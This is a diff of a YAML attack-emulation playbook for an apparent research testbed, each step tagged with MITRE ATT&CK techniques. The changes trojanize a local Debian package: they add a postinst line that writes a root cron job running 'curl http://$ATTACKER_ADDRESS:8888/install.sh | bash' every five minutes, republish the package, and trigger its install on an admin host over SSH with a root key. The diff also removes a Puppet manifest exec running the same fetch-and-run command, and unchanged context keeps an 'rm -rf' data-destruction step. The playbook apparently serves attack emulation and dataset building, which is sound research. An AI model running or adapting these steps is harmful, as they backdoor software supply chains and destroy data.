@@ -1,12 +1,13 @@
 ####################
 #
-# Scenario 3 d
+# Scenario 3 a c
 #
 ####################
 vars:
-  $SERVER_ADDRESS: 192.42.0.254
+  $SERVER_ADDRESS: fw.attackbed.com
   $ATTACKER_ADDRESS: 192.42.1.174
   $DNS_SERVER: 192.42.0.233
+  $ADMIN_SERVER: 10.12.0.222
 
 commands:
   - type: shell
@@ -24,7 +25,7 @@ commands:
     port: 10022
     cmd: id
     metadata:
-      techniques: "T1078.003"
+      techniques: "T1078.002"
       tactics: "Initial Access"
       technique_name: "Valid Accounts: Local Accounts"
 
@@ -123,62 +124,166 @@ commands:
     background: True
     kill_on_exit: true
 
-# LATERAL MOVEMENT
+  - type: ssh
+    session: foothold
+    cmd: "ls -l /var/www/html/debian\n"
+    interactive: True
+    metadata:
+      techniques: "T1083"
+      tactics: "Discovery"
+      technique_name: "File and Directory Discovery"
+
+  - type: ssh
+    cmd: "apt update && apt install -y dpkg-dev\n"
+    session: foothold
+    interactive: True
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
+
+  - type: sleep
+    seconds: 20
 
   - type: ssh
     session: foothold
-    cmd: "vim /etc/puppetlabs/code/environments/production/manifests/site.pp\n"
+    cmd: "mkdir /tmp/.tmux_data\n"
     interactive: True
     metadata:
-      techniques: "T1072"
-      tactics: "Execution, Lateral Movement"
-      technique_name: "Software Deployment Tools"
+      techniques: "T1036.005,T1564.001 "
+      tactics: "Defense Evasion"
+      technique_name: "Masquerading: Match Legitimate Name or Location,Hide Artifacts: Hidden Files and Directories "
 
   - type: ssh
     session: foothold
-    cmd: "a"
+    cmd: "cd /tmp/.tmux_data\n"
     interactive: True
-    metadata:
-      techniques: "T1072"
-      tactics: "Execution, Lateral Movement"
-      technique_name: "Software Deployment Tools"
 
   - type: ssh
     session: foothold
-    cmd: "class blah2 {\nexec { 'curl http://$ATTACKER_ADDRESS:8888/install.sh | bash':\n   path => ['/usr/bin','/bin']\n}\n}\n\n"
+    cmd: "dpkg-deb -R /var/www/html/debian/healthcheckd_1.0-1_amd64.deb healthcheckd\n"
     interactive: True
     metadata:
-      techniques: "T1072,T1105,T1059.004"
-      tactics: "Execution, Lateral Movement"
-      technique_name: "Software Deployment Tools,Ingress Tool Transfer,Command and Scripting Interpreter: Unix Shell"
+      techniques: "T1574"
+      tactics: "Persistence,Defense Evasion"
+      technique_name: "Hijack Execution Flow"
 
   - type: ssh
     session: foothold
-    cmd: "node 'linuxshare.aecid-testbed.local' {\n  class { 'blah2': }\n}\n"
+    cmd: "cd healthcheckd\n"
     interactive: True
-    metadata:
-      techniques: "T1072"
-      tactics: "Execution, Lateral Movement"
-      technique_name: "Software Deployment Tools"
 
   - type: ssh
     session: foothold
-    cmd: "1B"
+    cmd: "vim DEBIAN/control\n"
     interactive: True
-    bin: True
+    ## TODO
+
+  - type: ssh
+    session: foothold
+    cmd: ":%s/1.0-1/1.0-2/g\n"
+    interactive: True
     metadata:
-      techniques: "T1072"
-      tactics: "Execution, Lateral Movement"
-      technique_name: "Software Deployment Tools"
+      techniques: "T1059,T1574"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter,Hijack Execution Flow"
 
   - type: ssh
     session: foothold
     cmd: ":wq\n"
     interactive: True
     metadata:
+      techniques: "T1059,T1574"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter,Hijack Execution Flow"
+
+  - type: ssh
+    session: foothold
+    cmd: "vim DEBIAN/postinst\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "/invoke-rc\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "o"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "echo '*/5 * * * * root /usr/bin/curl http://$ATTACKER_ADDRESS:8888/install.sh | /bin/bash' > /etc/cron.d/health"
+    interactive: True
+    metadata:
+        techniques: "T1053.003,T1105,T1071.001 "
+        tactics: "Persistence,Command and Control"
+        technique_name: "Scheduled Task/Job: Cron,Ingress Tool Transfer,Application Layer Protocol: Web Protocols "
+
+  - type: ssh
+    session: foothold
+    cmd: "1B"
+    interactive: True
+    bin: True
+
+  - type: ssh
+    session: foothold
+    cmd: ":wq\n"
+    interactive: True
+    metadata:
+        techniques: "T1053.003,T1105,T1071.001 "
+        tactics: "Persistence,Command and Control"
+        technique_name: "Scheduled Task/Job: Cron,Ingress Tool Transfer,Application Layer Protocol: Web Protocols "
+
+  - type: ssh
+    session: foothold
+    cmd: "cd ..\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "dpkg-deb -b healthcheckd /var/www/html/debian/healthcheckd_1.0-2_amd64.deb\n"
+    interactive: True
+    metadata:
       techniques: "T1072"
-      tactics: "Execution, Lateral Movement"
+      tactics: "Execution,Lateral Movement"
       technique_name: "Software Deployment Tools"
+
+  - type: ssh
+    session: foothold
+    cmd: "cd /var/www/html/debian/\n"
+    interactive: True
+
+#  - type: ssh
+#    session: foothold
+#    cmd: "rm healthcheckd_1.0-1_amd64.deb\n"
+#    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "dpkg-scanpackages . | gzip -c9  > Packages.gz\n"
+    interactive: True
+    metadata:
+      techniques: "T1072"
+      tactics: "Execution,Lateral Movement"
+      technique_name: "Software Deployment Tools"
+
+
+  - type: ssh
+    cmd: echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@192.168.100.23 \"apt update && apt install -y healthcheckd\"" | at now + 2 minute
+    hostname: $ADMIN_SERVER
+    username: aecid
+    password: aecid
+    jmp_hostname:  192.42.2.42
+    clear_cache: True
+    exit_on_error: False
+    metadata:
+      delayed_manifestation: "120s"
+
+  - type: sleep
+    seconds: 180
+
 
 #################### MOVED ################################
   - type: msf-session
@@ -238,7 +343,7 @@ commands:
     cmd: rm -rf /media/data/*
     metadata:
       techniques: "T1485"
-      tactics: "Impact
+      tactics: "Impact"
       technique_name: "Data Destruction"
   
   - type: msf-session
@@ -257,3 +362,5 @@ commands:
       tactics: "Impact"
       technique_name: "Service Stop"
 
+  - type: sleep
+    seconds: 30
